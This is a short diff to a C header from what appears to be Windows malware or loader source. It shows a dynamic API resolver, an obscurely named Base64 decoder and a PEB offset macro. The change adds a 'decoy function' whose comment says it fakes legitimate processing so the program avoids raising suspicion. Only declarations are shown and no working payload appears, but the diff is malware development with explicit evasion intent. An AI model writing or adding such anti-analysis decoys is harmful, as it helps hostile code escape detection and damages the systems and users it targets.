@@ -21,6 +21,12 @@ FARPROC ResolveFn(LPCSTR mod, LPCSTR fn);
 // Base64Decode
 char* Bsfd(const char* encoded);
 
+/* Decoy function
+This function will generate 1,000 random numbers, sort them, and compute the average. 
+It looks like legitimate processing activity without raising suspicion.
+*/
+void SortNumbers();
+
 #ifdef _M_X64
 #define PEB_OFFSET 0x60
 #else
